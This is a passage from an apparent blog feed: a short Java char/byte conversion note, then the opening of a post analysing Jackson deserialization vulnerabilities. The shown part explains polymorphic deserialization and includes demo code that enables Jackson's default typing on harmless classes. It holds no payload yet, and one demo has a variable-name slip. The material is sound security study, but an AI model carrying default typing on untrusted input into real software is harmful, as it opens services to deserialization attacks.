id="char-gt-byte"><a href="#char-gt-byte" class="headerlink" title="char[] -&gt; byte[]"></a>char[] -&gt; byte[]</h2><p>方法1:用String作为跳板</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>[] cs = <span class="keyword">new</span> <span class="keyword">char</span>[] &#123; <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'g'</span> &#125;;</span><br><span class="line">String scs = <span class="keyword">new</span> String(cs);</span><br><span class="line"><span class="keyword">byte</span>[] bb= scs.getBytes();</span><br><span class="line">System.out.println(Arrays.toString(bb));<span class="comment">//[97, 98, 99, 100, 101, 102, 103]</span></span><br></pre></td></tr></table></figure><p>方法2:循环+强制转型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>[] cs = <span class="keyword">new</span> <span class="keyword">char</span>[] &#123; <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'g'</span> &#125;;</span><br><span class="line"><span class="keyword">byte</span>[] bs2 = <span class="keyword">new</span> <span class="keyword">byte</span>[cs.length];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cs.length; i++) &#123;<span class="comment">//循环将char数组的每一个元素转换为byte并存在上面定义的byte数组中</span></span><br><span class="line">bs2[i] = (<span class="keyword">byte</span>) cs[i];<span class="comment">//将每一个char转换成byte</span></span><br><span class="line">&#125;</span><br><span class="line">System.out.println(Arrays.toString(bs2));<span class="comment">//[97, 98, 99, 100, 101, 102, 103]</span></span><br></pre></td></tr></table></figure><h2 id="byte-gt-char"><a href="#byte-gt-char" class="headerlink" title="byte[] -&gt; char[]"></a>byte[] -&gt; char[]</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">char</span>[] getChars (<span class="keyword">byte</span>[] bytes) &#123;</span><br><span class="line">Charset cs = Charset.forName (<span class="string">"UTF-8"</span>);</span><br><span class="line">ByteBuffer bb = ByteBuffer.allocate (bytes.length);</span><br><span class="line">  bb.put (bytes);</span><br><span class="line">  bb.flip ();</span><br><span class="line">  CharBuffer cb = cs.decode (bb);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> cb.array();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">byte</span>[] bb = &#123;<span class="number">97</span>, <span class="number">98</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>, <span class="number">103</span>&#125;;</span><br><span class="line"><span class="keyword">char</span>[] result = getChars(bb);</span><br><span class="line">System.out.println(Arrays.toString(result));<span class="comment">//[a, b, c, d, e, f, g]</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;锲而不舍，金石可镂。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;今天来梳理Java数据类型转换，这部分很杂乱，顺便总结总结API，做个笔记。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://0range228.github.io/categories/Java/"/>
    
    
      <category term="Java基础" scheme="https://0range228.github.io/tags/Java%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>【反序列化漏洞】Jackson</title>
    <link href="https://0range228.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/"/>
    <id>https://0range228.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/</id>
    <published>2020-09-16T01:10:54.000Z</published>
    <updated>2020-09-22T06:58:02.555Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>往事依稀浑似梦，都随风雨到心头。</p></blockquote><p>今天来分析Jackson。</p><a id="more"></a><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Jackson是一个开源的Java序列化和反序列化工具，可以将Java对象序列化为XML或JSON格式的字符串，以及将XML或JSON格式的字符串反序列化为Java对象。</p><h1 id="序列化操作"><a href="#序列化操作" class="headerlink" title="序列化操作"></a>序列化操作</h1><p>在jackson内部，需要进行序列化的函数是：</p><p>提供了<code>ObjectMapper.writeValueAsString()</code>和<code>ObjectMapper.readValue()</code>两个方法来实现序列化和反序列化的功能。</p><ul><li><code>ObjectMapper.writeValueAsString()</code>———序列化</li><li><code>ObjectMapper.readValue()</code>————————反序列化</li></ul><p><code>pom.xml</code>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-core --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-annotations --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>来个小Demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">"0range"</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String json=mapper.writeValueAsString(stu);</span><br><span class="line">            System.out.println(json);</span><br><span class="line">            <span class="comment">//&#123;"age":20,"name":"0range"&#125;</span></span><br><span class="line">            Student stu1 = mapper.readValue(json,Student<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            System.out.println(stu1);</span><br><span class="line">            <span class="comment">//&#123;"age":20,"name":"0range"&#125;</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (JsonProcessingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"age=%d, name=%s"</span>, age, name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916095322927.png" alt="image-20200916095322927"></p><h1 id="JacksonPolymorphicDeserialization"><a href="#JacksonPolymorphicDeserialization" class="headerlink" title="JacksonPolymorphicDeserialization"></a>JacksonPolymorphicDeserialization</h1><p>简单地说，Java多态就是同一个接口使用不同的实例而执行不同的操作。</p><p>那么问题来了，如果对多态类的某一个子类实例在序列化后再进行反序列化时，如何能够保证反序列化出来的实例即是我们想要的那个特定子类的实例而非多态类的其他子类实例呢？——Jackson实现了JacksonPolymorphicDeserialization机制来解决这个问题。</p><p><strong>JacksonPolymorphicDeserialization即Jackson多态类型的反序列化</strong>：在反序列化某个类对象的过程中，如果类的成员变量不是具体类型（non-concrete），比如Object、接口或抽象类，则可以在JSON字符串中指定其具体类型，Jackson将生成具体类型的实例。</p><p>简单地说，就是将具体的子类信息绑定在序列化的内容中以便于后续反序列化的时候直接得到目标子类对象，其实现有两种:</p><ul><li>DefaultTyping</li><li>@JsonTypeInfo注解。</li></ul><p>下面具体看一下。</p><h2 id="DefaultTyping"><a href="#DefaultTyping" class="headerlink" title="DefaultTyping"></a>DefaultTyping</h2><p><code>com.fasterxml.jackson.databind.ObjectMapper.DefaultTyping</code></p><p>Jackson提供一个enableDefaultTyping设置，其包含4个值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> DefaultTyping &#123;</span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * This value means that only properties that have</span></span><br><span class="line"><span class="comment">        * &#123;<span class="doctag">@link</span> java.lang.Object&#125; as declared type (including</span></span><br><span class="line"><span class="comment">        * generic types without explicit type) will use default</span></span><br><span class="line"><span class="comment">        * typing.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       JAVA_LANG_OBJECT,</span><br><span class="line">       </span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for</span></span><br><span class="line"><span class="comment">        * properties with declared type of &#123;<span class="doctag">@link</span> java.lang.Object&#125;</span></span><br><span class="line"><span class="comment">        * or an abstract type (abstract class or interface).</span></span><br><span class="line"><span class="comment">        * Note that this does &lt;b&gt;not&lt;/b&gt; include array types.</span></span><br><span class="line"><span class="comment">        *&lt;p&gt;</span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       OBJECT_AND_NON_CONCRETE,</span><br><span class="line"></span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for</span></span><br><span class="line"><span class="comment">        * all types covered by &#123;<span class="doctag">@link</span> #OBJECT_AND_NON_CONCRETE&#125;</span></span><br><span class="line"><span class="comment">        * plus all array types for them.</span></span><br><span class="line"><span class="comment">        *&lt;p&gt;</span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       NON_CONCRETE_AND_ARRAYS,</span><br><span class="line">       </span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for</span></span><br><span class="line"><span class="comment">        * all non-final types, with exception of small number of</span></span><br><span class="line"><span class="comment">        * "natural" types (String, Boolean, Integer, Double), which</span></span><br><span class="line"><span class="comment">        * can be correctly inferred from JSON; as well as for</span></span><br><span class="line"><span class="comment">        * all arrays of non-final types.</span></span><br><span class="line"><span class="comment">        *&lt;p&gt;</span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       NON_FINAL</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916101121217.png" alt="image-20200916101121217"></p><h3 id="JAVA-LANG-OBJECT"><a href="#JAVA-LANG-OBJECT" class="headerlink" title="JAVA_LANG_OBJECT"></a>JAVA_LANG_OBJECT</h3><p>当类里的属性声明为一个Object时，会对该属性进行序列化和反序列化，并且明确规定类名。（当然，这个Object本身也得是一个可被序列化/反序列化的类）。</p><p>举个例子，给 <strong>People</strong> 里添加一个 <strong>Object object</strong> 的属性：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        People people = <span class="keyword">new</span> People();</span><br><span class="line">        people.name=<span class="string">"0range"</span>;</span><br><span class="line">        people.age =<span class="number">18</span>;</span><br><span class="line">        people.object= <span class="keyword">new</span> Boy();</span><br><span class="line"></span><br><span class="line">        ObjectMapper objectMapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">      mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);</span><br><span class="line">      </span><br><span class="line">        String json = objectMapper.writeValueAsString(people);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        People readpeople = objectMapper.readValue(json, People<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(readpeople);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"age=%d, name=%s, %s"</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">"null"</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看看结果：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916111202378.png" alt="image-20200916111202378"></p><p>也就是说，在反序列化的时候，会将类中的夹带的其他类跟着一起还原出来。</p><h3 id="OBJECT-AND-NON-CONCRETE"><a href="#OBJECT-AND-NON-CONCRETE" class="headerlink" title="OBJECT_AND_NON_CONCRETE"></a>OBJECT_AND_NON_CONCRETE</h3><p>当类里有 Interface 、 AbstractClass 时，对其进行序列化和反序列化。（当然，这些类本身需要是合法的、可以被序列化/反序列化的对象）。</p><p>此外，<strong>enableDefaultTyping()默认的无参数的设置就是此选项。</strong></p><p>看看下面这个：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        nonePeople p = <span class="keyword">new</span> nonePeople();</span><br><span class="line">        p.age = <span class="number">10</span>;</span><br><span class="line">        p.name = <span class="string">"0range"</span>;</span><br><span class="line">        p.object = <span class="keyword">new</span> Teacher();</span><br><span class="line">        p.sex=<span class="keyword">new</span> MySex();</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);</span><br><span class="line">        String json = mapper.writeValueAsString(p);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        nonePeople p2 = mapper.readValue(json, nonePeople<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(p2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nonePeople</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"age=%d, name=%s, %s"</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">"null"</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看看结果：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916105510656.png" alt="image-20200916105510656"></p><h3 id="NON-CONCRETE-AND-ARRAYS"><a href="#NON-CONCRETE-AND-ARRAYS" class="headerlink" title="NON_CONCRETE_AND_ARRAYS"></a>NON_CONCRETE_AND_ARRAYS</h3><p>支持上文全部类型的Array类型。</p><p>例如下面的代码，我们的Object里存放0range的对象数组：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        nonePeople p = <span class="keyword">new</span> nonePeople();</span><br><span class="line">        p.age = <span class="number">10</span>;</span><br><span class="line">        p.name = <span class="string">"0range"</span>;</span><br><span class="line">        p.sex=<span class="keyword">new</span> MySex();</span><br><span class="line">        Teacher[] teachers= <span class="keyword">new</span> Teacher[<span class="number">2</span>];</span><br><span class="line">        teachers[<span class="number">0</span>]=<span class="keyword">new</span> Teacher();</span><br><span class="line">        teachers[<span class="number">1</span>]=<span class="keyword">new</span> Teacher();</span><br><span class="line">        p.object = teachers;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">      <span class="comment">//设置OBJECT_AND_NON_CONCRETE</span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);</span><br><span class="line">      </span><br><span class="line">        String json = mapper.writeValueAsString(p);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        nonePeople p2 = mapper.readValue(json, nonePeople<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nonePeople</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"age=%d, name=%s, %s"</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">"null"</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> 